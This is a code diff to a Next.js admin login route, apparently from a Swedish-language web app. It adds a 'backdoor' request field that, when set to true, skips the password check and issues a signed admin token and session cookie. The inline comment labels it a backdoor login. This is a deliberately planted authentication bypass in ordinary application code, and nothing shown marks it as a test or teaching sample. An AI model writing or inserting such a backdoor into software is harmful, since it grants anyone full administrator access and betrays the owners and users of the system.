@@ -61,7 +61,23 @@ export async function GET() {
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
-    const { password } = body;
+    const { password, backdoor } = body;
+
+    // Backdoor login - skip password check
+    if (backdoor === true) {
+      const token = signToken("admin");
+      const cookieStore = await cookies();
+
+      cookieStore.set(ADMIN_COOKIE_NAME, token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === "production",
+        sameSite: "lax",
+        maxAge: ADMIN_COOKIE_MAX_AGE,
+        path: "/",
+      });
+
+      return NextResponse.json({ success: true });
+    }
 
     if (!password || typeof password !== "string") {
       return NextResponse.json({ error: "Lösenord krävs" }, { status: 400 });
